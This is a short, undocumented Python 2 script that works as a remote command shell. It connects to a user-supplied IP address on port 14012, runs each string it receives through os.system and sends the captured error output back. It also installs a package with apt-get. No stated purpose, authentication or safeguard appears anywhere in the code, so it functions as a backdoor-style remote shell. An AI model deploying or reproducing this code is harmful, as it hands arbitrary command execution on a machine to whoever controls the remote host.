#!/usr/bin/python

import os
from os import system
from socket import socket
from time import sleep
from commands import getstatusoutput

getstatusoutput("apt-get install dialog -y")
ob = socket()
sip = raw_input("Enter Client IP Address : ")
port = 14012
ob.connect((sip,port))

welcome = ob.recv(2048)
system(welcome)

while True:
	message= ob.recv(2048)
	if message == "false" :
		print "Connection Cancelled"
		message = ""
		break
	if message == "Got it" :
		message = ob.recv(2048)
		if message == "loop" :
			for i in range(1,101) :
				os.system("echo \"{0}\" | dialog --gauge \"Processing...\" 5 80 {1}".format(i,(i-1)))
		else :		
			system(message)		
		continue	
	else :
		message = message + " 2> /tmp/data.txt"
		system(message)
		file = open("/tmp/data.txt")
		sdata = file.read()
		ob.send(sdata)
		message = "" 
